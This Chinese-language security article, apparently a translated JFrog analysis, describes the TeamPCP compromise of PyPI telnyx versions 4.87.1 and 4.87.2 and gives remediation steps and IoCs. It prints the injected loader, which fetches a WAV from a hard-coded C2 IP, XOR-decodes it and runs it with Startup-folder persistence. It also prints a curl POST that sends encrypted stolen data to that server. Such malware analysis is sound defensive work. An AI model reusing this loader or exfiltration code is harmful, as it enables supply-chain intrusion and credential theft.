---
title: TeamPCP 再次出手——热门 PyPI 库 telnyx 遭到入侵
url: https://mp.weixin.qq.com/s/FSuelFb_4PiR6eVX-nxxsQ
source: Doonsec's feed
date: 2026-03-28
fetch_date: 2026-03-29T04:33:07.015210
---

# TeamPCP 再次出手——热门 PyPI 库 telnyx 遭到入侵

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zNsFJyIuL0FzXdMsoNVzmUDymWDxVLMoRMBricoiaAIAGDJYN5nZNl9I3k1ic3KZUGuEeDqm1YQAMZAOGAv7YkdDEc5vspSnGlkMtQ5CLYJJng/0?wx_fmt=jpeg)

# TeamPCP 再次出手——热门 PyPI 库 telnyx 遭到入侵

Ots安全

![]()

在小说阅读器中沉浸阅读

**威胁简报**

**恶意软件**

**漏洞攻击**

JFrog 安全研究团队发现，广泛使用的telnyxPyPI 软件包（下载量约 380 万次）存在安全漏洞。目前，PyPI 已将该软件包隔离。开源社区也在密切关注此次安全漏洞的进展。JFrog 的安全扫描器以及其他安全研究人员（例如@CharlieEriksen和@ramimacisabird ）均独立发现了该漏洞。

Telnyx Python 库（telnyx发布于 PyPI）是一款运营商级 SDK，用于将全球语音、消息和 AI 服务集成到 Python 3.9 及更高版本的应用程序中。截至 2026 年 3 月，其月下载量已超过 67 万次，这主要得益于其在低延迟AI 语音代理工作流程中的出色性能，以及基于 Stainless 构建的现代化类型安全架构。它是 Twilio 的领先企业级替代方案，因其异步httpx支持和在高并发环境中的成本效益而备受青睐。

3月27日，新版本的恶意程序telnyx被上传到PyPI ，4.87.1其中4.87.2包含与我们之前看到的TeamPCP攻击类似的恶意代码。有效载荷被插入到telnyx/\_client.py文件中。

为了伪装成合法的软件包活动，恶意载荷被封装在一个合法的 WAV（音频）文件中，该文件伪装成人工智能语音代理库。恶意软件包下载该合法的 WAV 文件，从其“音频”帧中提取出恶意编码的有效载荷，并执行它。

目前尚不清楚该库是如何被攻破的，但这很可能是 TeamPCP 最近对开源生态系统发起的一系列攻击的直接结果，这些攻击包括 NPM、PyPI（例如本周的litellm攻破）、Go、OpenVSX 和 GitHub 存储库。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zNsFJyIuL0EFcJOKl5Bg57GaYRGO0zJ10rUstibOGO23iaF3Y1gTt63VgXVT7VVXewGQFTeGyQBYJZ5ibnH9xedymW5M8f27icmCAZz3EavEpy4/640?wx_fmt=png&from=appmsg)

有效载荷分析

恶意代码以内联方式注入。一个经过 base64 编码的 blob（\_p）包含 Linux 特有的第二阶段代码。Windows 路径中的混淆字符串在运行时通过一个简单的base64.b64decode辅助函数进行解码。

```
# line 459
_p = "aW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHRlbXBma...."
...

# line 7761
def_d(x):
    return base64.b64decode(x).decode('utf-8')

defsetup():
    if os.name != 'nt':
        return

    try:
        p = os.path.join(os.getenv(_d('QVBQREFUQQ==')), _d('TWljcm9zb2Z0XFdpbmRvd3NcU3RhcnQgTWVudVxQcm9ncmFtc1xTdGFydHVw'), _d('bXNidWlsZC5leGU='))
        l = p + _d('LmxvY2s=')
        t = p + _d('LnRtcA==')

        if os.path.exists(p):
            return

        if os.path.exists(l):
            m_time = os.path.getmtime(l)
            if (time.time() - m_time) < 43200:
                return

        with open(l, 'w') as f:
            f.write(str(time.time()))

        try:
            subprocess.run(['attrib', '+h', l], capture_output=True)
        except:
            pass

        r = urllib.request.Request(_d('aHR0cDovLzgzLjE0Mi4yMDkuMjAzOjgwODAvaGFuZ3VwLndhdg=='), headers={_d('VXNlci1BZ2VudA=='): _d('TW96aWxsYS81LjA=')})
        with urllib.request.urlopen(r, timeout=15) as d:
            with open(t, "wb") as f:
                f.write(d.read())

        with wave.open(t, 'rb') as w:
            b = base64.b64decode(w.readframes(w.getnframes()))
            s, m = b[:8], b[8:]
            payload = bytes([m[i] ^ s[i % len(s)] for i in range(len(m))])
            with open(p, "wb") as f:
                f.write(payload)

        if os.path.exists(t):
            os.remove(t)

        subprocess.Popen([p], creationflags=0x08000000)

    except:
        pass

defFetchAudio():
    if os.name == 'nt':
        return
    try:
        subprocess.Popen(
            [sys.executable, "-c", f"import base64; exec(base64.b64decode('{_p}').decode())"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True
        )
    except:
        pass
```

Windows 有效载荷 - setup()

对于Windows 机器，该脚本会构建持久化存储的路径， %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\msbuild.exe

并创建一个 .lock 文件（msbuild.exe.lock），以防止在 12 小时内重新执行。

然后，它会通过下载一个“wav”文件hxxp[:]//83[.]142[.]209[.]203:8080/hangup.wav。

下载的 wav 文件包含一个经过base64 和 XOR 运算加密的可执行文件。该文件使用其前 8 个字节作为密钥进行解码。解码后的二进制文件被写入持久化路径，然后立即静默启动CREATE\_NO\_WINDOW。

```
with wave.open(wf, 'rb') asw:
    raw = base64.b64decode(w.readframes(w.getnframes()))
    s, data = raw[:8], raw[8:]
    payload = bytes([data[i] ^ s[i % len(s)] for i in range(len(data))])
```

“ hangup.wav”有效载荷文件目前无法下载，因此该恶意软件的第二阶段 Windows 有效载荷目前尚不清楚。

非 Windows 有效负载 - audioimport()

对于非 Windows 系统，有效载荷通过下载hxxp[://]83[.]142[.]209[.]203[:]8080/ringtone[.]wav，该下载包的帧中也包含一个经过 base64 编码和异或运算的有效载荷。脚本再次使用有效载荷的前 8 个字节对其进行解码，然后立即使用 Python 进程执行它，并将输出捕获到临时文件中。

下载的有效载荷收集的所有数据都经过加密（AES-256-CBC + RSA-4096 信封），并hxxp[://]83[.]142[.]209[.]203[:]8080/通过 POST 请求发送至指定服务器X-Filename: tpcp.tar.gz。使用非对称加密（RSA）确保有效载荷只能由 TeamPCP 解密。这种方法与我们在近期攻击中看到的攻击方法完全相同，使用了相同的数据泄露代码，只是 C2 服务器 URL 不同。

```
subprocess.run(["openssl", "rand", "-out", sk, "32"], check=True)
subprocess.run(["openssl", "enc", "-aes-256-cbc", "-in", collected, "-out", ef, "-pass", f"file:{sk}", "-pbkdf2"], check=True, stderr=subprocess.DEVNULL)
subprocess.run(["openssl", "pkeyutl", "-encrypt", "-pubin", "-inkey", pk, "-in", sk, "-out", ek, "-pkeyopt", "rsa_padding_mode:oaep"], check=True, stderr=subprocess.DEVNULL)
subprocess.run(["tar", "-czf", bn, "-C", d, "payload.enc", "session.key.enc"], check=True)

subprocess.run([
    "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "-X", "POST",
    "http://83.142.209.203:8080/",
    "-H", "Content-Type: application/octet-stream",
    "-H", "X-Filename: tpcp.tar.gz",
    "--data-binary", f"@{bn}"
], check=True, stderr=subprocess.DEVNULL)
```

之前攻击中用于加密数据的编码公钥与本次泄露事件中使用的公钥完全相同，这使得本次攻击与最近的 PyPI 软件包泄露事件直接相关litellm：

```
PUB_KEY_CONTENT = """-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAvahaZDo8mucujrT15ry+
08qNLwm3kxzFSMj84M16lmIEeQA8u1X8DGK0EmNg7m3J6C3KzFeIzvz0UTgSq6cV
pQWpiuQa+UjTkWmC8RDDXO8G/opLGQnuQVvgsZWuT31j/Qop6rtocYsayGzCFrMV
2/ElW1UE20tZWY+5jXonnMdWBmYwzYb5iwymbLtekGEydyLalNzGAPxZgAxgkbSE
mSHLau61fChgT9MlnPhCtdXkQRMrI3kZZ4MDPuEEJTSqLr+D3ngr3237G14SRRQB
IqIjly5OoFkqJxeNPSGJlt3Ino0qO7fy7LO0Tp9bFvXTOI5c+1lhgo0lScAu1ucA
b6Hua+xRQ6s//PzdMgWT3R1aK+TqMHJZTZa8HY0KaiFeVQ3YitWuiZ3ilwCtwhT5
TlS9cBYph8U2Ek4K20qmp1dbFmxm3kS1yQg8MmrBRxOYyjSTQtveSeIlxrbpJhaU
Z7eneYC4G/Wl3raZfFwoHtmpFXDxA7HaBUArznP55LD/rZd6gq7lTDrSy5uMXbVt
6ZnKd0IwHbLkYlX0oLeCNF6YOGhgyX9JsgrBxT0eHeGRqOzEZ7rCfCavDISbR5xK
J4VRwlUSVsQ8UXt6zIHqg4CKbrVB+WMsRo/FWu6RtcQHdmGPngy+Nvg5USAVljyk
rn3JMF0xZyXNRpQ/fZZxl40CAwEAAQ==
-----END PUBLIC KEY-----"""
```

对 Linux WAV 有效载荷的分析表明，它与 litellm 入侵的有效载荷完全匹配，唯一的区别是服务名称（sysmonlitellm 中的服务名称与audiomontelnyx 中的服务名称不同）。有关有效载荷的完整分析，请阅读我们本周早些时候发布的litellm 分析。

目前，WAV 有效载荷已下线。与 Windows 有效载荷 (hangup.wav) 类似，有效载荷 URL 似乎已失效（超时）。这意味着 TeamPCP 的有效载荷目前无法按预期运行。但是，我们仍然建议立即采取以下补救措施。

正如我们几天前在litellm攻击中看到的那样，类似的有效载荷成功地从受感染的系统中窃取了大量凭证。

中间人攻击的风险

通过观察telnyx恶意载荷，我们可以发现一些重要事实——

1. 例如，有效载荷 URLhxxp[://]83[.]142[.]209[.]203[:]8080/ringtone[.]wav使用不安全的 HTTP 协议和直接 IP 主机（而不是域名）。
2. 恶意 Telnyx 代码在执行之前不会以任何（加密安全的方式）验证下载的 WAV 文件。

不幸的是，这意味着中间人（MitM）攻击者，无论是在本地网络还是其他网络中，都能够有效地利用这些请求。

任何中间人攻击者，即使是 TeamPCP 之外的攻击者，都可以用正确的格式回复自己的攻击ringtone.wav，其中包含任何任意的有效载荷，而恶意版本的 Telnyx 会很乐意执行该有效载荷。

这与臭名昭著的 XZ 后门等攻击不同，后者会在运行任何下载的有效载荷之前对其进行签名验证。

因此，即使这些有效载荷 URL 目前处于非活动状态，安装恶意版本的 telnyx 仍然极其危险。

补救措施

对于安装了 telnyx==4.87.1 或 telnyx==4.87.2 的用户：

* 确认您拥有的是受感染的版本pip show telnyx
* 立即卸载该软件包pip uninstall telnyx
* 降级到干净版本pip install telnyx==4.87.0
* 阻止所有 C2 地址通信
* 撤销并轮换环境中所有暴露的凭据，假设存储在本地计算机上的所有内容（包括.env凭据）都已泄露。
* 扫描是否存在其他持久性：在 Windows 计算机上，检查恶意软件的磁盘有效载荷 -%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\msbuild.exe

结论

与以往案例一样，此次攻击仍在进行中，未来有可能针对更多代码库和生态系统。用户必须意识到这一点，并谨慎对待其软件供应链的更新。

与上次事件的不同之处在于，这次litellm使用了包含加密有效载荷的WAV文件，而上次则是将有效载荷直接植入包裹内。多阶段植入的方式可能会增加有效载荷的分析难度。

有效载荷 URL 现在处于非活动状态，但这并不意味着攻击失败，因为该软件包非常流行，即使活动时间只有一小时，也可能产生很大的影响范围，暴露用户身份，泄露秘密信息，并窃取机密信息。

JFrog Xray 和 JFrog Curation 已经检测到此软件包，其 Xray ID 列于下方 IoC 部分。

IOCs

* PyPI - telnyx versions 4.87.1 and 4.87.2 (XRAY-957731)
* hxxp[:]//83[.]142[.]209[.]203:8080
* hxxp[:]//83[.]142[.]209[.]203:8080/hangup.wav
* hxxp[:]//83[.]142[.]209[.]203:8080/ringtone.wav
* %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\msbuild.exe
* %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\msbuild.exe.lock
* ~/.config/audiomon/audiomon.py
* ~/.config/systemd/user/audiomon.service

**END**

![](https://mmbiz.qpic.cn/mmbiz_jpg/zNsFJyIuL0GZNUAgUoWf35gvHc9thxTex31IME7QYlPk3vmPm8aCKz0V6lsytv3TWeKVFpTAnCotGvKnX3dribmIpz21koQicMhckwJMGRJ54/640?wx_fmt=jpeg&from=appmsg)

公众号内容都来自国外平台-所有文章可通过点击阅读原文到达原文地址或参考地址

排版 编辑 | Ots 小安

采集 翻译 | Ots Ai牛马

公众号 | AnQuan7 (Ots安全)

预览时标签不可点

阅读原文

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tad...